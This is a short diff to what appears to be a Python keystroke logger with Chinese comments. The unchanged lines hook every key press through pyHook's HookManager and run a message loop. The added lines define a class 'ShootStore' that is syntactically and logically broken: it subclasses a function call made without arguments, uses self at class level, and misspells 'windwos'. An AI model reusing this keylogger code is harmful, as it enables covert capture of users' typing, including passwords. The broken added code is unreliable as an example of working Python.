@@ -67,6 +67,13 @@ def KeyStroke(event):
     # 循环监听下一个击键事件
     return True
 
+class ShootStore(KeyStroke()):
+    self.a = current_window
+
+    def windwos(self):
+        return self.a
+
+
 
 # 创建并注册hook管理器
 kl = pyHook.HookManager()
@@ -75,4 +82,9 @@ kl.KeyDown = KeyStroke
 # 注册hook并执行
 kl.HookKeyboard()
 pythoncom.PumpMessages()
+
+
+
+
+
 
